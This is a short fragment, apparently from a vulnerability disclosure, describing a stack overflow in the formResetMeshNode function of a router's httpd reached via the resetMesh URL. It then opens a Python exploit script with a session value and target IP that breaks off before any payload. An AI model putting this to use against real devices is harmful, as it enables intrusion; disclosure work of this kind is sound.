...
httpd in directory `/bin` has a stack overflow vulnerability. The vulnerability occurrs in the `formResetMeshNode` function, which can be accessed via the URL `resetMesh`
...
if __name__ == '__main__':
    #Fireitup
    session='W30EV2.0:0.171.1:10d346d'
    ip = '192.168.0.1'  
    # 构造http数据包
    s='1'
    pdata = {
